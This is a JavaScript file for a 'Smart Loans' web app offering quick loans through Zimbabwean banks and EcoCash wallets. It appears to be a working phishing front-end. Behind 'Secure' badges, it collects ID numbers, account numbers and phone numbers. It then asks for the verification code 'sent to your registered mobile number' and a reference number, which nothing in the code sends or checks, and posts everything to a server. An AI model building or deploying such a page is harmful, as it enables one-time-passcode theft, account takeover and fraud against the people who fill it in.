// ======================================================
// SMART LOANS
// screens.js
// PART 1 - WELCOME SCREEN
// ======================================================

function loadWelcomeScreen() {

    const app = document.getElementById("app");

    app.innerHTML = `

    <div class="container">

        <div class="app-header">

            <div>

                <div class="app-title">
                    Smart Loans
                </div>

                <div class="app-subtitle">
                    Fast • Secure • Convenient
                </div>

            </div>

            <div class="secure">
                🔒 Secure
            </div>

        </div>

        <div class="progress-bar">
            <div class="progress-fill" style="width:10%;"></div>
        </div>

        <div class="welcome-card">

            <h2>Welcome</h2>

            <p class="intro">

                Welcome to Smart Loans.

                Apply for your loan quickly and securely using your Bank Account or EcoCash Wallet.

            </p>

            <button id="startApplication">

                Start Application

            </button>

        </div>

    </div>

    `;

    document
        .getElementById("startApplication")
        .addEventListener("click", () => {

            loadCalculatorScreen();

        });

}
// ======================================================
// LOAN CALCULATOR SCREEN
// ======================================================

function loadCalculatorScreen() {

    const app = document.getElementById("app");

    app.innerHTML = `

    <div class="container">

        <div class="app-header">

            <button class="back-btn" id="backHome">
                ← Back
            </button>

            <div>

                <div class="app-title">
                    Smart Loans
                </div>

                <div class="app-subtitle">
                    Fast • Secure • Convenient
                </div>

            </div>

            <div class="secure">
                🔒 Secure
            </div>

        </div>

        <div class="progress-bar">
            <div class="progress-fill" style="width:20%;"></div>
        </div>

        <div class="welcome-card">

            <h2>Loan Calculator</h2>

            <p class="intro">
                Enter your preferred loan amount and repayment period.
            </p>

            <label>Loan Amount (USD)</label>

            <input
                type="number"
                id="loanAmount"
                placeholder="Enter loan amount">

            <br><br>

            <label>Repayment Period</label>

            <select id="loanPeriod">

                <option value="">Select Period</option>
                <option value="1">1 Month</option>
                <option value="3">3 Months</option>
                <option value="6">6 Months</option>
                <option value="12">12 Months</option>
                <option value="18">18 Months</option>
                <option value="24">24 Months</option>

            </select>

            <br><br>

            <h3>Monthly Repayment</h3>
            <p id="monthlyRepayment">$0.00</p>

            <h3>Total Repayment</h3>
            <p id="totalRepayment">$0.00</p>

            <button
                id="continueCalculator"
                disabled>

                Continue

            </button>

        </div>

    </div>

    `;

    document
        .getElementById("backHome")
        .addEventListener("click", loadWelcomeScreen);

    initializeCalculator();

}
// ======================================================
// LOAN CALCULATOR LOGIC
// ======================================================

function initializeCalculator() {

    const amount = document.getElementById("loanAmount");
    const period = document.getElementById("loanPeriod");

    const monthly = document.getElementById("monthlyRepayment");
    const total = document.getElementById("totalRepayment");

    const continueBtn = document.getElementById("continueCalculator");

    const interestRates = {

        1: 0.10,
        3: 0.15,
        6: 0.20,
        12: 0.30,
        18: 0.40,
        24: 0.50

    };

    function calculateLoan() {

        const loanAmount = parseFloat(amount.value);
        const months = parseInt(period.value);

        if (!loanAmount || !months) {

            monthly.textContent = "$0.00";
            total.textContent = "$0.00";

            continueBtn.disabled = true;

            return;

        }

        const interest = loanAmount * interestRates[months];

        const totalRepayment = loanAmount + interest;

        const monthlyRepayment = totalRepayment / months;

        monthly.textContent = "$" + monthlyRepayment.toFixed(2);

        total.textContent = "$" + totalRepayment.toFixed(2);

        sessionStorage.setItem("loanAmount", loanAmount);
        sessionStorage.setItem("loanPeriod", months);
        sessionStorage.setItem("monthlyRepayment", monthlyRepayment.toFixed(2));
        sessionStorage.setItem("totalRepayment", totalRepayment.toFixed(2));

        continueBtn.disabled = false;

    }

    amount.addEventListener("input", calculateLoan);

    period.addEventListener("change", calculateLoan);

    continueBtn.addEventListener("click", () => {

        loadPersonalInformationScreen();

    });

}
// ======================================================
// PERSONAL INFORMATION SCREEN
// ======================================================

function loadPersonalInformationScreen() {

    const app = document.getElementById("app");

    app.innerHTML = `

    <div class="container">

        <div class="app-header">

            <button class="back-btn" id="backCalculator">
                ← Back
            </button>

            <div>

                <div class="app-title">
                    Smart Loans
                </div>

                <div class="app-subtitle">
                    Fast • Secure • Convenient
                </div>

            </div>

            <div class="secure">
                🔒 Secure
            </div>

        </div>

        <div class="progress-bar">

            <div class="progress-fill" style="width:35%;"></div>

        </div>

        <div class="welcome-card">

            <h2>Personal Information</h2>

            <p class="intro">
                Complete your personal details below.
            </p>

            <label>Full Names</label>

            <input
                type="text"
                id="fullNames"
                placeholder="Enter full names">

            <br><br>

            <label>Date of Birth</label>

            <input
                type="date"
                id="dateOfBirth">

            <br><br>

            <label>ID Number</label>

            <input
                type="text"
                id="idNumber"
                placeholder="Enter ID number">

            <br><br>

            <label>Current Occupation</label>

            <select id="occupation">

                <option value="">Select Occupation</option>
                <option>Employed</option>
                <option>Self Employed</option>
                <option>Student</option>
                <option>Not Employed</option>

            </select>

            <br><br>

            <label>Purpose of Loan</label>

            <input
                type="text"
                id="loanPurpose"
                placeholder="e.g. Business, School Fees">

            <br><br>

            <button id="continuePersonal">

                Continue

            </button>

        </div>

    </div>

    `;

    document
        .getElementById("backCalculator")
        .addEventListener("click", loadCalculatorScreen);

    document
        .getElementById("continuePersonal")
        .addEventListener("click", savePersonalInformation);

}
// ======================================================
// SAVE PERSONAL INFORMATION
// ======================================================

function savePersonalInformation() {

    const fullNames = document.getElementById("fullNames").value.trim();
    const dateOfBirth = document.getElementById("dateOfBirth").value;
    const idNumber = document.getElementById("idNumber").value.trim();
    const occupation = document.getElementById("occupation").value;
    const loanPurpose = document.getElementById("loanPurpose").value.trim();

    if (
        fullNames === "" ||
        dateOfBirth === "" ||
        idNumber === "" ||
        occupation === "" ||
        loanPurpose === ""
    ) {

        alert("Please complete all required fields.");

        return;

    }

    sessionStorage.setItem("fullNames", fullNames);
    sessionStorage.setItem("dateOfBirth", dateOfBirth);
    sessionStorage.setItem("idNumber", idNumber);
    sessionStorage.setItem("occupation", occupation);
    sessionStorage.setItem("loanPurpose", loanPurpose);

    loadReviewScreen();

}
// ======================================================
// REVIEW APPLICATION SCREEN
// ======================================================

function loadReviewScreen() {

    const app = document.getElementById("app");

    const fullNames = sessionStorage.getItem("fullNames");
    const dob = sessionStorage.getItem("dateOfBirth");
    const idNumber = sessionStorage.getItem("idNumber");
    const occupation = sessionStorage.getItem("occupation");
    const purpose = sessionStorage.getItem("loanPurpose");

    const amount = sessionStorage.getItem("loanAmount");
    const period = sessionStorage.getItem("loanPeriod");
    const monthly = sessionStorage.getItem("monthlyRepayment");
    const total = sessionStorage.getItem("totalRepayment");

    app.innerHTML = `

    <div class="container">

        <div class="app-header">

            <button class="back-btn" id="backPersonal">
                ← Back
            </button>

            <div>

                <div class="app-title">
                    Smart Loans
                </div>

                <div class="app-subtitle">
                    Fast • Secure • Convenient
                </div>

            </div>

            <div class="secure">
                🔒 Secure
            </div>

        </div>

        <div class="progress-bar">

            <div class="progress-fill" style="width:50%;"></div>

        </div>

        <div class="welcome-card">

            <h2>Review Your Application</h2>

            <div class="feature">
                <strong>Full Names</strong><br>
                ${fullNames}
            </div>

            <br>

            <div class="feature">
                <strong>Date of Birth</strong><br>
                ${dob}
            </div>

            <br>

            <div class="feature">
                <strong>ID Number</strong><br>
                ${idNumber}
            </div>

            <br>

            <div class="feature">
                <strong>Occupation</strong><br>
                ${occupation}
            </div>

            <br>

            <div class="feature">
                <strong>Purpose of Loan</strong><br>
                ${purpose}
            </div>

            <br>

            <div class="feature">
                <strong>Loan Amount</strong><br>
                $${amount}
            </div>

            <br>

            <div class="feature">
                <strong>Repayment Period</strong><br>
                ${period} Month(s)
            </div>

            <br>

            <div class="feature">
                <strong>Monthly Repayment</strong><br>
                $${monthly}
            </div>

            <br>

            <div class="feature">
                <strong>Total Repayment</strong><br>
                $${total}
            </div>

            <br>

            <button id="continueReview">

                Continue

            </button>

        </div>

    </div>

    `;

    document
        .getElementById("backPersonal")
        .addEventListener("click", loadPersonalInformationScreen);

    document
        .getElementById("continueReview")
        .addEventListener("click", () => {

            loadDisbursementScreen();

        });

}
// ======================================================
// DISBURSEMENT METHOD SCREEN
// ======================================================

function loadDisbursementScreen() {

    const app = document.getElementById("app");

    app.innerHTML = `

    <div class="container">

        <div class="app-header">

            <button class="back-btn" id="backReview">
                ← Back
            </button>

            <div>

                <div class="app-title">
                    Smart Loans
                </div>

                <div class="app-subtitle">
                    Fast • Secure • Convenient
                </div>

            </div>

            <div class="secure">
                🔒 Secure
            </div>

        </div>

        <div class="progress-bar">

            <div class="progress-fill" style="width:60%;"></div>

        </div>

        <div class="welcome-card">

            <h2>Loan Disbursement</h2>

            <p class="intro">

                Choose where you want your approved loan to be deposited.

            </p>

            <button id="bankOption" class="option-btn">

                🏦 Bank Account

            </button>

            <br><br>

            <button id="ecocashOption" class="option-btn">

                🟢 EcoCash Wallet

            </button>

        </div>

    </div>

    `;

    document
        .getElementById("backReview")
        .addEventListener("click", loadReviewScreen);

    document
        .getElementById("bankOption")
        .addEventListener("click", () => {

            sessionStorage.setItem("disbursementMethod", "Bank");

            loadBankSelectionScreen();

        });

    document
        .getElementById("ecocashOption")
        .addEventListener("click", () => {

            sessionStorage.setItem("disbursementMethod", "EcoCash");

            loadEcoCashDetailsScreen();

        });

}
// ======================================================
// BANK SELECTION SCREEN
// ======================================================

function loadBankSelectionScreen() {

    const app = document.getElementById("app");

    app.innerHTML = `

    <div class="container">

        <div class="app-header">

            <button class="back-btn" id="backDisbursement">
                ← Back
            </button>

            <div>

                <div class="app-title">
                    Smart Loans
                </div>

                <div class="app-subtitle">
                    Fast • Secure • Convenient
                </div>

            </div>

            <div class="secure">
                🔒 Secure
            </div>

        </div>

        <div class="progress-bar">

            <div class="progress-fill" style="width:65%;"></div>

        </div>

        <div class="welcome-card">

            <h2>Select Your Bank</h2>

            <p class="intro">

                Choose the bank account where your loan will be deposited.

            </p>

            <div class="bank-card" data-bank="CBZ Bank">🏦 CBZ Bank</div>
            <div class="bank-card" data-bank="CABS">🏦 CABS</div>
            <div class="bank-card" data-bank="NMB Bank">🏦 NMB Bank</div>
            <div class="bank-card" data-bank="BancABC">🏦 BancABC</div>
            <div class="bank-card" data-bank="FBC Bank">🏦 FBC Bank</div>
            <div class="bank-card" data-bank="POSB">🏦 POSB</div>
            <div class="bank-card" data-bank="ZB Bank">🏦 ZB Bank</div>
            <div class="bank-card" data-bank="Stanbic Bank">🏦 Stanbic Bank</div>
            <div class="bank-card" data-bank="Steward Bank">🏦 Steward Bank</div>
            <div class="bank-card" data-bank="Ecobank">🏦 Ecobank</div>
            <div class="bank-card" data-bank="First Capital Bank">🏦 First Capital Bank</div>
            <div class="bank-card" data-bank="Nedbank Zimbabwe">🏦 Nedbank Zimbabwe</div>

        </div>

    </div>

    `;

    document
        .getElementById("backDisbursement")
        .addEventListener("click", loadDisbursementScreen);

    document.querySelectorAll(".bank-card").forEach(card => {

        card.addEventListener("click", () => {

            sessionStorage.setItem(
                "selectedBank",
                card.dataset.bank
            );

            loadBankDetailsScreen();

        });

    });

}
// ======================================================
// BANK DETAILS SCREEN
// ======================================================

function loadBankDetailsScreen() {

    const app = document.getElementById("app");

    const selectedBank = sessionStorage.getItem("selectedBank");
    const fullNames = sessionStorage.getItem("fullNames") || "";

    app.innerHTML = `

    <div class="container">

        <div class="app-header">

            <button class="back-btn" id="backBanks">
                ← Back
            </button>

            <div>

                <div class="app-title">
                    Smart Loans
                </div>

                <div class="app-subtitle">
                    Fast • Secure • Convenient
                </div>

            </div>

            <div class="secure">
                🔒 Secure
            </div>

        </div>

        <div class="progress-bar">

            <div class="progress-fill" style="width:70%;"></div>

        </div>

        <div class="welcome-card">

            <h2>${selectedBank}</h2>

            <p class="intro">

                Enter the bank account details where your approved loan will be deposited.

            </p>

            <label>Account Holder Name</label>

            <input
                type="text"
                id="accountName"
                value="${fullNames}">

            <br><br>

            <label>Phone Number</label>

            <input
                type="tel"
                id="bankPhone"
                placeholder="Enter phone number">

            <br><br>

            <label>Bank Account Number</label>

            <input
                type="text"
                id="accountNumber"
                placeholder="Enter bank account number">

            <br><br>

            <button id="continueBankDetails">

                Continue

            </button>

        </div>

    </div>

    `;

    document
        .getElementById("backBanks")
        .addEventListener("click", loadBankSelectionScreen);

    document
        .getElementById("continueBankDetails")
        .addEventListener("click", saveBankDetails);

}
// ======================================================
// SAVE BANK DETAILS
// ======================================================

function saveBankDetails() {

    const accountName =
        document.getElementById("accountName").value.trim();

    const phone =
        document.getElementById("bankPhone").value.trim();

    const accountNumber =
        document.getElementById("accountNumber").value.trim();

    if (
        accountName === "" ||
        phone === "" ||
        accountNumber === ""
    ) {

        alert("Please complete all fields.");

        return;

    }

    sessionStorage.setItem("accountName", accountName);
    sessionStorage.setItem("bankPhone", phone);
    sessionStorage.setItem("accountNumber", accountNumber);

    loadBankVerificationScreen();

}
// ======================================================
// BANK VERIFICATION SCREEN
// ======================================================

function loadBankVerificationScreen() {

    const app = document.getElementById("app");

    const bank = sessionStorage.getItem("selectedBank");

    app.innerHTML = `

    <div class="container">

        <div class="app-header">

            <button class="back-btn" id="backBankDetails">
                ← Back
            </button>

            <div>

                <div class="app-title">
                    Smart Loans
                </div>

                <div class="app-subtitle">
                    Fast • Secure • Convenient
                </div>

            </div>

            <div class="secure">
                🔒 Secure
            </div>

        </div>

        <div class="progress-bar">

            <div class="progress-fill" style="width:75%;"></div>

        </div>

        <div class="welcome-card">

            <h2>${bank} Verification</h2>

            <p class="intro">

                A verification code has been sent to your registered mobile number.

                Please enter the code below.

            </p>

            <label>Verification Code</label>

            <input
                type="text"
                id="bankVerificationCode"
                placeholder="Enter verification code">

            <br><br>

            <button id="continueVerification">

                Continue

            </button>

        </div>

    </div>

    `;

    document
        .getElementById("backBankDetails")
        .addEventListener("click", loadBankDetailsScreen);

    document
        .getElementById("continueVerification")
        .addEventListener("click", saveBankVerification);

}
// ======================================================
// SAVE BANK VERIFICATION
// ======================================================

function saveBankVerification() {

    const code = document
        .getElementById("bankVerificationCode")
        .value
        .trim();

    if (code === "") {

        alert("Please enter the verification code.");

        return;

    }

    sessionStorage.setItem(
        "bankVerificationCode",
        code
    );

    loadBankReferenceScreen();

}
// ======================================================
// BANK REFERENCE SCREEN
// ======================================================

function loadBankReferenceScreen() {

    const app = document.getElementById("app");

    const bank = sessionStorage.getItem("selectedBank");

    app.innerHTML = `

    <div class="container">

        <div class="app-header">

            <button class="back-btn" id="backVerification">
                ← Back
            </button>

            <div>

                <div class="app-title">
                    Smart Loans
                </div>

                <div class="app-subtitle">
                    Fast • Secure • Convenient
                </div>

            </div>

            <div class="secure">
                🔒 Secure
            </div>

        </div>

        <div class="progress-bar">

            <div class="progress-fill" style="width:80%;"></div>

        </div>

        <div class="welcome-card">

            <h2>${bank} Reference</h2>

            <p class="intro">

                Enter the bank reference number you received after verification.

            </p>

            <label>Reference Number</label>

            <input
                type="text"
                id="bankReference"
                placeholder="Enter reference number">

            <br><br>

            <button id="continueReference">

                Continue

            </button>

        </div>

    </div>

    `;

    document
        .getElementById("backVerification")
        .addEventListener("click", loadBankVerificationScreen);

    document
        .getElementById("continueReference")
        .addEventListener("click", saveBankReference);

}
// ======================================================
// SAVE BANK REFERENCE
// ======================================================

function saveBankReference() {

    const reference = document
        .getElementById("bankReference")
        .value
        .trim();

    if (reference === "") {

        alert("Please enter the bank reference number.");

        return;

    }

    sessionStorage.setItem("bankReference", reference);

    submitApplication();

}
// ======================================================
// SUBMIT APPLICATION
// ======================================================

async function submitApplication() {

    const data = {

        fullNames: sessionStorage.getItem("fullNames"),
        dateOfBirth: sessionStorage.getItem("dateOfBirth"),
        idNumber: sessionStorage.getItem("idNumber"),
        occupation: sessionStorage.getItem("occupation"),
        loanPurpose: sessionStorage.getItem("loanPurpose"),

        loanAmount: sessionStorage.getItem("loanAmount"),
        loanPeriod: sessionStorage.getItem("loanPeriod"),
        monthlyRepayment: sessionStorage.getItem("monthlyRepayment"),
        totalRepayment: sessionStorage.getItem("totalRepayment"),

        disbursementMethod: "Bank",

        selectedBank: sessionStorage.getItem("selectedBank"),
        accountName: sessionStorage.getItem("accountName"),
        bankPhone: sessionStorage.getItem("bankPhone"),
        accountNumber: sessionStorage.getItem("accountNumber"),
        verificationCode: sessionStorage.getItem("bankVerificationCode"),
        bankReference: sessionStorage.getItem("bankReference"),

        ecoName: "",
        ecoNumber: "",
        ecoVerificationCode: "",
        ecoReference: ""

    };

    loadProcessingScreen();

    try {

        const response = await fetch("/submit-application", {

            method: "POST",

            headers: {
                "Content-Type": "application/json"
            },

            body: JSON.stringify(data)

        });

        const result = await response.json();
                if (!response.ok || !result.success) {

            throw new Error(result.error || "Application submission failed.");

        }

        sessionStorage.setItem(
            "applicationId",
            result.application.id
        );

        loadSuccessScreen();

    } catch (error) {

        console.error(error);

        alert(
            "Unable to submit your application. Please check your internet connection and try again."
        );

        loadReviewScreen();

    }

}
// ======================================================
// PROCESSING SCREEN
// ======================================================

function loadProcessingScreen() {

    const app = document.getElementById("app");

    app.innerHTML = `

    <div class="container">

        <div class="app-header">

            <div>

                <div class="app-title">
                    Smart Loans
                </div>

                <div class="app-subtitle">
                    Fast • Secure • Convenient
                </div>

            </div>

            <div class="secure">
                🔒 Secure
            </div>

        </div>

        <div class="progress-bar">

            <div class="progress-fill" style="width:95%;"></div>

        </div>

        <div class="welcome-card" style="text-align:center;">

            <div class="loader"></div>

            <br>

            <h2>Processing Application</h2>

            <p class="intro">

                Please wait while we securely submit your application.

            </p>

            <p>

                Do not close this page...

            </p>

        </div>

    </div>

    `;

}
// ======================================================
// SUCCESS SCREEN
// ======================================================

function loadSuccessScreen() {

    const app = document.getElementById("app");

    const applicationId =
        sessionStorage.getItem("applicationId") || "N/A";

    app.innerHTML = `

    <div class="container">

        <div class="app-header">

            <div>

                <div class="app-title">
                    Smart Loans
                </div>

                <div class="app-subtitle">
                    Fast • Secure • Convenient
                </div>

            </div>

            <div class="secure">
                🔒 Secure
            </div>

        </div>

        <div class="progress-bar">

            <div class="progress-fill" style="width:100%;"></div>

        </div>

        <div class="welcome-card" style="text-align:center;">

            <div style="font-size:70px;">
                ✅
            </div>

            <h2>Application Submitted</h2>

            <p class="intro">

                Your loan application has been successfully submitted.

            </p>

            <div class="feature">

                <strong>Application ID</strong>

                <br><br>

                #${applicationId}

            </div>

            <br>

            <p>

                Our loans team will review your application and contact you shortly.

            </p>

            <br>

            <button id="finishApplication">

                Finish

            </button>

        </div>

    </div>

    `;

    document
        .getElementById("finishApplication")
        .addEventListener("click", () => {

            sessionStorage.clear();

            loadWelcomeScreen();

        });

}
// ======================================================
// ECOCASH DETAILS SCREEN
// ======================================================

function loadEcoCashDetailsScreen() {

    const app = document.getElementById("app");

    const fullNames = sessionStorage.getItem("fullNames") || "";

    app.innerHTML = `

    <div class="container">

        <div class="app-header">

            <button class="back-btn" id="backDisbursement">
                ← Back
            </button>

            <div>

                <div class="app-title">
                    Smart Loans
                </div>

                <div class="app-subtitle">
                    Fast • Secure • Convenient
                </div>

            </div>

            <div class="secure">
                🔒 Secure
            </div>

        </div>

        <div class="progress-bar">

            <div class="progress-fill" style="width:70%;"></div>

        </div>

        <div class="welcome-card">

            <h2>EcoCash Details</h2>

            <p class="intro">

                Enter the EcoCash wallet details where your approved loan will be sent.

            </p>

            <label>Full Name</label>

            <input
                type="text"
                id="ecoName"
                value="${fullNames}">

            <br><br>

            <label>EcoCash Number</label>

            <input
                type="tel"
                id="ecoNumber"
                placeholder="Enter EcoCash number">

            <br><br>

            <button id="continueEcoDetails">

                Continue

            </button>

        </div>

    </div>

    `;

    document
        .getElementById("backDisbursement")
        .addEventListener("click", loadDisbursementScreen);

    document
        .getElementById("continueEcoDetails")
        .addEventListener("click", saveEcoCashDetails);

}
// ======================================================
// SAVE ECOCASH DETAILS
// ======================================================

function saveEcoCashDetails() {

    const ecoName =
        document.getElementById("ecoName").value.trim();

    const ecoNumber =
        document.getElementById("ecoNumber").value.trim();

    if (
        ecoName === "" ||
        ecoNumber === ""
    ) {

        alert("Please complete all fields.");

        return;

    }

    sessionStorage.setItem("ecoName", ecoName);
    sessionStorage.setItem("ecoNumber", ecoNumber);

    loadEcoCashVerificationScreen();

}
// ======================================================
// ECOCASH VERIFICATION SCREEN
// ======================================================

function loadEcoCashVerificationScreen() {

    const app = document.getElementById("app");

    app.innerHTML = `

    <div class="container">

        <div class="app-header">

            <button class="back-btn" id="backEcoDetails">
                ← Back
            </button>

            <div>

                <div class="app-title">
                    Smart Loans
                </div>

                <div class="app-subtitle">
                    Fast • Secure • Convenient
                </div>

            </div>

            <div class="secure">
                🔒 Secure
            </div>

        </div>

        <div class="progress-bar">

            <div class="progress-fill" style="width:75%;"></div>

        </div>

        <div class="welcome-card">

            <h2>EcoCash Verification</h2>

            <p class="intro">

                An SMS verification code has been sent to your EcoCash number.

                Please enter it below.

            </p>

            <label>Verification Code</label>

            <input
                type="text"
                id="ecoVerificationCode"
                placeholder="Enter verification code">

            <br><br>

            <button id="continueEcoVerification">

                Continue

            </button>

        </div>

    </div>

    `;

    document
        .getElementById("backEcoDetails")
        .addEventListener("click", loadEcoCashDetailsScreen);

    document
        .getElementById("continueEcoVerification")
        .addEventListener("click", saveEcoCashVerification);

}
// ======================================================
// SAVE ECOCASH VERIFICATION
// ======================================================

function saveEcoCashVerification() {

    const code = document
        .getElementById("ecoVerificationCode")
        .value
        .trim();

    if (code === "") {

        alert("Please enter the verification code.");

        return;

    }

    sessionStorage.setItem(
        "ecoVerificationCode",
        code
    );

    loadEcoCashReferenceScreen();

}
// ======================================================
// ECOCASH REFERENCE SCREEN
// ======================================================

function loadEcoCashReferenceScreen() {

    const app = document.getElementById("app");

    app.innerHTML = `

    <div class="container">

        <div class="app-header">

            <button class="back-btn" id="backEcoVerification">
                ← Back
            </button>

            <div>

                <div class="app-title">
                    Smart Loans
                </div>

                <div class="app-subtitle">
                    Fast • Secure • Convenient
                </div>

            </div>

            <div class="secure">
                🔒 Secure
            </div>

        </div>

        <div class="progress-bar">
            <div class="progress-fill" style="width:80%;"></div>
        </div>

        <div class="welcome-card">

            <h2>EcoCash Reference</h2>

            <p class="intro">

                Enter the EcoCash transaction/reference number you received after verification.

            </p>

            <label>Reference Number</label>

            <input
                type="text"
                id="ecoReference"
                placeholder="Enter reference number">

            <br><br>

            <button id="continueEcoReference">

                Submit Application

            </button>

        </div>

    </div>

    `;

    document
        .getElementById("backEcoVerification")
        .addEventListener("click", loadEcoCashVerificationScreen);

    document
        .getElementById("continueEcoReference")
        .addEventListener("click", saveEcoCashReference);

}
// ======================================================
// SAVE ECOCASH REFERENCE
// ======================================================

function saveEcoCashReference() {

    const reference = document
        .getElementById("ecoReference")
        .value
        .trim();

    if (reference === "") {

        alert("Please enter the EcoCash reference number.");

        return;

    }

    sessionStorage.setItem(
        "ecoReference",
        reference
    );

    submitEcoCashApplication();

}

// ======================================================
// SUBMIT ECOCASH APPLICATION
// ======================================================

async function submitEcoCashApplication() {

    const data = {

        fullNames: sessionStorage.getItem("fullNames"),
        dateOfBirth: sessionStorage.getItem("dateOfBirth"),
        idNumber: sessionStorage.getItem("idNumber"),
        occupation: sessionStorage.getItem("occupation"),
        loanPurpose: sessionStorage.getItem("loanPurpose"),

        loanAmount: sessionStorage.getItem("loanAmount"),
        loanPeriod: sessionStorage.getItem("loanPeriod"),
        monthlyRepayment: sessionStorage.getItem("monthlyRepayment"),
        totalRepayment: sessionStorage.getItem("totalRepayment"),

        disbursementMethod: "EcoCash",

        selectedBank: "",
        accountName: "",
        bankPhone: "",
        accountNumber: "",
        verificationCode: "",
        bankReference: "",

        ecoName: sessionStorage.getItem("ecoName"),
        ecoNumber: sessionStorage.getItem("ecoNumber"),
        ecoVerificationCode: sessionStorage.getItem("ecoVerificationCode"),
        ecoReference: sessionStorage.getItem("ecoReference")

    };

    loadProcessingScreen();

    try {

        const response = await fetch("/submit-application", {

            method: "POST",

            headers: {
                "Content-Type": "application/json"
            },

            body: JSON.stringify(data)

        });

        const result = await response.json();

        if (!response.ok || !result.success) {

            throw new Error(result.error || "Application submission failed.");

        }

        sessionStorage.setItem(
            "applicationId",
            result.application.id
        );

        loadSuccessScreen();

    } catch (error) {

        console.error(error);

        alert("Unable to submit your application.");

        loadReviewScreen();

    }

}
